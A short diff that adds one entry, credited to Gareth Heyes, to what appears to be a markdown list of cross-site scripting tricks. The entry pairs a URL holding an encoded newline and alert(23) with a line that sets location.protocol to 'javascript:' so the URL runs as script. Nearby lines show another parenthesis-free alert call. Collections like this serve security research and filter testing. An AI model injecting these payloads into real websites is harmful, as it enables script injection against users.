@@ -93,6 +93,14 @@ Only Chrome [Garethheyes](http://www.thespanner.co.uk/2012/05/01/xss-technique-w
 
 ----
 
+
+[Garethheyes](https://twitter.com/garethheyes/status/1606307100212154368?s=20&t=eIysWGLwjjIQwQE-AgV2Vw)
+
+    http://example.com/?%0aalert(23)
+    location.protocol='javascript:'
+
+----
+
 [Garethheyes](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
 
     [].sort.call`${alert}23`
